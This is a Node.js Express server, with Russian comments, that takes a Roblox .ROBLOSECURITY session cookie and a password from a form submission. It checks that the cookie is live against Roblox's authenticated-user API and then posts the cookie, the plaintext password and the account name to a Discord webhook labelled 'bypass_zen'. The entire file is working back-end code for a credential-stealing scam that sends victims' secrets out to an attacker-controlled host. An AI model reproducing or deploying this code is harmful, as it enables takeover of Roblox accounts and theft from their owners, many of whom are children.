const express = require('express');
const fetch = require('node-fetch');
const app = express();

app.use(express.json());

// Разрешаем CORS
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

// Пинг-эндпоинт для разбуживания сервера Render
app.get('/ping', (req, res) => res.send('OK'));

// Эндпоинт валидации и отправки
app.post('/api/submit', async (req, res) => {
  const { cookie, password, category, webhookUrl } = req.body;

  if (!cookie || !password) {
    return res.status(400).json({ isValid: false, reason: "Missing fields" });
  }

  // Чистим куку от _|WARNING...
  let cleaned = cookie.trim();
  if (cleaned.startsWith("_|WARNING")) {
    const parts = cleaned.split("|_");
    if (parts.length >= 2) cleaned = parts[parts.length - 1].trim();
  }
  cleaned = cleaned.replace(/^["';]+|["';]+$/g, "").trim();

  try {
    // 1. Запрос к Roblox API
    const robloxRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'application/json',
        'Cookie': `.ROBLOSECURITY=${cleaned}`
      }
    });

    if (robloxRes.status !== 200) {
      return res.status(400).json({ 
        isValid: false, 
        reason: robloxRes.status === 401 ? "Invalid cookie" : `Roblox HTTP ${robloxRes.status}` 
      });
    }

    const userData = await robloxRes.json();
    if (!userData || !userData.id) {
      return res.status(400).json({ isValid: false, reason: "Failed to parse Roblox user" });
    }

    // 2. Кука валидна — отправляем в Discord прямо с бэкенда
    if (webhookUrl) {
      const safeCookie = message => "```\n" + message.replace(/`/g, "'") + "\n```";
      const payload = {
        username: "bypass_zen",
        embeds: [{
          title: "📩 New Submission",
          color: 0x2ecc71,
          description:
            `**🗂 Category:** ${category}\n` +
            `**👤 User:** ${userData.name || "Unknown"} (ID: ${userData.id})\n\n` +
            `**📝 Cookie**\n${safeCookie(cookie)}` +
            `\n**🔑 Password**\n${safeCookie(password)}`,
          footer: { text: "bypass_zen · 2026" },
          timestamp: new Date().toISOString()
        }]
      };

      await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    }

    return res.json({
      isValid: true,
      userId: userData.id,
      username: userData.name || "Unknown"
    });

  } catch (err) {
    return res.status(500).json({ isValid: false, reason: "Server error: " + err.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
